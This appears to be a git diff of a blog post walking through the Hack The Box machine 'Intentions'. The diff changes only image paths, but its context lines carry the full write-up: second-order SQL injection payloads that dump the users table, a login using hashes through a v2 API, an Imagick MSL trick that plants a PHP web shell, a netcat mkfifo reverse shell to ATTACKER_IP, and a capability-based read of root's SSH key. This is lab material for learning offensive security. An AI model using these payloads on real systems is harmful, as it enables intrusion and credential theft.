@@ -65,21 +65,21 @@ Starting gobuster in directory enumeration mode
 
 Checking the landing page shows a login panel for the site's image gallery application where we must use an email and password for any attempts.
 
-![](../assets/img/2026-02-12-Intentions/1.png)
+![](/assets/img/2026-02-12-Intentions/1.png)
 
 There is a register function so I create a new account to take a peak inside for any potential places to exploit.
 
-2![](../assets/img/2026-02-12-Intentions/2.png)
+2![](/assets/img/2026-02-12-Intentions/2.png)
 
 This site has the entire gallery on one tab along with another personal feed where we're able to filter genres to customize it. I'm pretty certain we'll need to exploit the register page to load SSTI payloads via our username field or some kind of second-order SQLi in our profile preferences to dump the database. The presence of certain genre types indicate that these images get stored in a database which can be queried using the parameter inside that update profile function. 
 
 Just to cover all grounds, I decode the session cookie which shows that it just stores some encoded identifier to keep track of our login. All discovered endpoints such as `/admin, /js, and /css` return a `403 Forbidden` code so we will need higher privileges to access them.
 
-![](../assets/img/2026-02-12-Intentions/3.png)
+![](/assets/img/2026-02-12-Intentions/3.png)
 
 First I test for server-side template injection, checking if the site performs a simple mathematical operation. This doesn't end up working for common engine payloads nor any polyglots to proc an error.
 
-![](../assets/img/2026-02-12-Intentions/4.png)
+![](/assets/img/2026-02-12-Intentions/4.png)
 
 ## Second-Order SQLi
 Now I move to testing second-order SQL injection by appending a single quote to our genre preferences. This nullifies our personal feed page which confirms the server throws an error when supplied with those type of characters.
@@ -88,13 +88,13 @@ Now I move to testing second-order SQL injection by appending a single quote to 
 food, travel, nature'
 ```
 
-![](../assets/img/2026-02-12-Intentions/5.png)
+![](/assets/img/2026-02-12-Intentions/5.png)
 
 Capturing a request to the update profile function in Burp Suite shows that we make a POST request to `/api/v1/gallery/user/genres` which will only respond with a 200 code, meaning that any injections here are not reflected until we navigate to our personal feed (hence the second-order name).
 
 This is possible due to the server not filtering special characters in the registration function. Developers should be using parameterized queries to mitigate and prevent such a vulnerability from arising. If you're curious about more information on this attack vector, [here](https://portswigger.net/kb/issues/00100210_sql-injection-second-order) is a great article containing resources to learn from.
 
-![](../assets/img/2026-02-12-Intentions/6.png)
+![](/assets/img/2026-02-12-Intentions/6.png)
 
 I begin fuzzing for more API endpoints in case we find any and need to use them in the near future. 
 
@@ -131,7 +131,7 @@ First I will enumerate the number of columns so the server actually responds to 
 "genres":"nature')/**/UNION/**/SELECT/**/1,2,3,4,5#"
 ```
 
-![](../assets/img/2026-02-12-Intentions/7.png)
+![](/assets/img/2026-02-12-Intentions/7.png)
 
 Because the page outputs the value of each image's genre on the personal feed, I use the second column to enumerate the database name.
 
@@ -139,7 +139,7 @@ Because the page outputs the value of each image's genre on the personal feed, I
 "genres":"')/**/UNION/**/SELECT/**/1,(select/**/group_concat(SCHEMA_NAME)/**/from/**/information_schema.schemata),3,4,5#"
 ```
 
-![](../assets/img/2026-02-12-Intentions/8.png)
+![](/assets/img/2026-02-12-Intentions/8.png)
 
 Next, I check the table and column names inside of the intentions DB.
 
@@ -147,7 +147,7 @@ Next, I check the table and column names inside of the intentions DB.
 "genres":"')/**/UNION/**/SELECT/**/1,(select/**/group_concat(TABLE_NAME,':',COLUMN_NAME)/**/from/**/information_schema.columns/**/where/**/TABLE_SCHEMA/**/LIKE/**/'intentions'),3,4,5#"
 ```
 
-![](../assets/img/2026-02-12-Intentions/9.png)
+![](/assets/img/2026-02-12-Intentions/9.png)
 
 Finally, I'll dump the email, password, and admin columns from the users table to see if we're able to sign in as admin here or reuse creds over SSH. That admin column is used to identify each account with their role of administrator or normal user which is handy.
 
@@ -161,41 +161,41 @@ That dumps the users table in the intentions database and gives us the bcrypt ha
 sed 's/,/\r\n/g' DBdump.txt > users.txt
 ```
 
-![](../assets/img/2026-02-12-Intentions/10.png)
+![](/assets/img/2026-02-12-Intentions/10.png)
 
 As we can see, the value prepended to each line is the admin identifier denoting that only Steve and Greg have administrator level access to the website. Problem is, those hashes don't crack and we can't supply Bcrypt strings as our passwords on for that login API.
 
 ## API v2 Login
 Back to enumeration to find anything to exploit. Trying all possibilities for `/api/v1` and `/api/v2` returned nothing other than the `/auth/login` which was being used on the normal login panel. I kept on fuzzing for exposed files and directories until getting a few hits under the `/js` folder.
 
-![](../assets/img/2026-02-12-Intentions/11.png)
+![](/assets/img/2026-02-12-Intentions/11.png)
 
 These all seem to be bootstrap javascript files but I quickly parse them anyways for more endpoints. Inside of `admin.js` are a few comments made by the developer disclosing that they have rolled out v2 APIs and no longer use plaintext passwords for authentication as they are lacking HTTPS.
 
-![](../assets/img/2026-02-12-Intentions/12.png)
+![](/assets/img/2026-02-12-Intentions/12.png)
 
 This makes it seem like we can literally supply our enumerated hashes on those `/api/v2/` endpoints. I'll test this by capturing a normal login request to the original panel and changing v1 to v2 while providing a Bcrypt hash.
 
-![](../assets/img/2026-02-12-Intentions/13.png)
+![](/assets/img/2026-02-12-Intentions/13.png)
 
 The response shows that we need to use the hash field in place of the original password. In doing so, I get a successful login as both Steve and Greg.
 
-![](../assets/img/2026-02-12-Intentions/14.png)
+![](/assets/img/2026-02-12-Intentions/14.png)
 
 ## Initial Foothold via Imagick
 Now that we have administrative privileges on the website, I go to `/admin` and find the same two messages found inside `admin.js` under the news tab. There are also two other tabs which display info on everything pertaining to file URLs and user info. At the end of the second message is a link to a module used to apply effects to the images. This discloses that the site is using the Imagick PHP extension in order to do so.
 
-![](../assets/img/2026-02-12-Intentions/15.png)
+![](/assets/img/2026-02-12-Intentions/15.png)
 
 Since I hadn't found an upload API, I do some research on what this extension does. Turns out that we can use this to edit/apply certain things to preexisting files on the server. I also come across [CVE-2016–3714](https://nvd.nist.gov/vuln/detail/CVE-2016-3714) which explains that an attacker can execute arbitrary code via shell metacharacters in specially crafted images. We don't yet know the version of Imagick that's running but it's worth a shot due to the significant security risks.
 
 Only problem is, we still can't upload arbitrary files to the server. While searching the site some more, I find these effect buttons while editing an image that use the Imagick PHP extension to apply the filters. 
 
-![](../assets/img/2026-02-12-Intentions/16.png)
+![](/assets/img/2026-02-12-Intentions/16.png)
 
 After capturing a request, I test the path parameter to see if it sanitizes input by attempting to read `/etc/passwd`. That responds with a bad image path due to there being no `.jpg` extension. Next, I test to see if the application will make an outbound connection to my attacking machine or is just local.
 
-![](../assets/img/2026-02-12-Intentions/17.png)
+![](/assets/img/2026-02-12-Intentions/17.png)
 
 That payload confirms that it's possible to make the server read `.jpg` files hosted on our machine. While researching Imagick, I found a few CVEs with proof of concepts displaying how to get remote command execution on affected systems, however none of them seemed to work.
 
@@ -224,7 +224,7 @@ We also need to add the path and effect parameters to our URL for Imagick to fun
 /api/v2/admin/image/modify?path=vid:msl:/tmp/php*&effect=swirl
 ```
 
-![](../assets/img/2026-02-12-Intentions/18.png)
+![](/assets/img/2026-02-12-Intentions/18.png)
 
 The server responds with a `502 Bad Gateway` code which is to be expected since it technically can't reach the read file, however this still writes the contents to our shell. When trying to execute commands, I just could not get the file to be read by the server, even inside of the storage folder. After a LOT of tinkering, I found that by placing our shell inside the public directory, we're able to navigate to the page in order to load the file.
 
@@ -234,7 +234,7 @@ The server responds with a `502 Bad Gateway` code which is to be expected since 
 ```
 {% endraw %}
 
-![](../assets/img/2026-02-12-Intentions/19.png)
+![](/assets/img/2026-02-12-Intentions/19.png)
 
 Note that the server automatically cleans up the public folder every some odd minutes so reupload the shell if needed. Final step for this exploit is to grab a reverse shell with your choice of payload. I go with a Netcat mkfifo one-liner, making sure to URL encode key characters so the server can interpret it.
 
@@ -242,7 +242,7 @@ Note that the server automatically cleans up the public folder every some odd mi
 /shell.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/bash+-i+2>%261|nc+ATTACKER_IP+PORT+>/tmp/f
 ```
 
-![](../assets/img/2026-02-12-Intentions/20.png)
+![](/assets/img/2026-02-12-Intentions/20.png)
 
 Now that we have a shell on the box as `www-data`, I start internal enumeration for any sensitive files. We're limited as to what we can access so I head for databases, ill-secured backups, and any configuration files that may contain user credentials.
 
@@ -250,7 +250,7 @@ Now that we have a shell on the box as `www-data`, I start internal enumeration 
 ## Privilege Escalation
 Whilst looking in the webapp's directory, I find that `.git` is available to us. I'm thinking that in the early stages of development, the owner may have hardcoded their creds into an config file or that. I just needed a way to transfer these to my attacking machine as I kept on getting dubious ownership errors when retrieving the git logs. 
 
-![](../assets/img/2026-02-12-Intentions/21.png)
+![](/assets/img/2026-02-12-Intentions/21.png)
 
 I ended up zipping the `.git` directory into a TAR archive and moving it to `/public` once again so I could just grab it with my browser instead of having to transfer everything over Netcat or something.
 
@@ -261,30 +261,30 @@ tar -xvjf git.tar.bz2
 ### Dumping Git Logs
 With all the files on my machine, I start checking logs for any info on what could've been changed between commits. This shows one entry explaining that test cases did not work on a local database.
 
-![](../assets/img/2026-02-12-Intentions/22.png)
+![](/assets/img/2026-02-12-Intentions/22.png)
 
 Looking at the difference between that commit and a previous one shows a pair of credentials for Greg, just as expected.
 
-![](../assets/img/2026-02-12-Intentions/23.png)
+![](/assets/img/2026-02-12-Intentions/23.png)
 
 ### Reading SSH Key with Scanner
 I use those to login via SSH as Greg and begin looking at routes for privilege escalation. We can also grab the user flag under his home directory at this point. The default shell for his account isn't bash which I thought was strange, but we're also in a strange group named scanner.
 
-![](../assets/img/2026-02-12-Intentions/24.png)
+![](/assets/img/2026-02-12-Intentions/24.png)
 
 While searching for all files containing scanner in the name, I come across this scanner binary owned by root under `/opt`.
 
-![](../assets/img/2026-02-12-Intentions/25.png)
+![](/assets/img/2026-02-12-Intentions/25.png)
 
 It seems like this binary is used to perform scans against files or directories and compare them to known blacklisted values in order to search for matches. We don't have Sudo permissions on anything and this file doesn't have its SUID/SGID bit set, however the `cap_dac_read_search=ep` capability is enabled.
 
-![](../assets/img/2026-02-12-Intentions/26.png)
+![](/assets/img/2026-02-12-Intentions/26.png)
 
 This capability provides the ability to bypass ANY existing read permissions on the filesystem. Here's [an article](https://juggernaut-sec.com/capabilities/) diving into capability privesc techniques. Having this enabled makes sense as it allows the scanner to search every file on the box for known malicious names which can then be used for purging.
 
 The scanner uses certain flags to match files, words, or even characters to their MD5sum equivalent for better searching. This means that if we supply a character's MD5 hash value and compare it to a position inside of a file, we can enumerate file contents one character at a time. I test this on a file saying hello while specifying the hash value of the letter h.
 
-![](../assets/img/2026-02-12-Intentions/27.png)
+![](/assets/img/2026-02-12-Intentions/27.png)
 
 That matches the hash value to the letter and confirms this theory actually works. Obviously that would incredibly meticulous to do by hand, so I'm going to vibe code a program that will do this for us. 
 
@@ -344,10 +344,10 @@ while running:
 
 I upload that to the target machine and let it run a bit. This script prints most of the key, we just need to append the footer line from another one to get it to work as well as chmod 600 the file so SSH will accept it. 
 
-![](../assets/img/2026-02-12-Intentions/28.png)
+![](/assets/img/2026-02-12-Intentions/28.png)
 
 Finally we can use the key to login via SSH as root user to claim the final flag under their home directory.
 
-![](../assets/img/2026-02-12-Intentions/29.png)
+![](/assets/img/2026-02-12-Intentions/29.png)
 
 That's all y'all, honestly this box was pretty difficult for me as each step was very meticulous and took the better part of a day to finish. All in all, I learned a ton so thanks to [htbas9du](https://app.hackthebox.com/users/388108?profile-top-tab=machines&ownership-period=1M&profile-bottom-tab=prolabs) for making this challenge. I hope this was helpful to anyone following along or stuck and happy hacking!
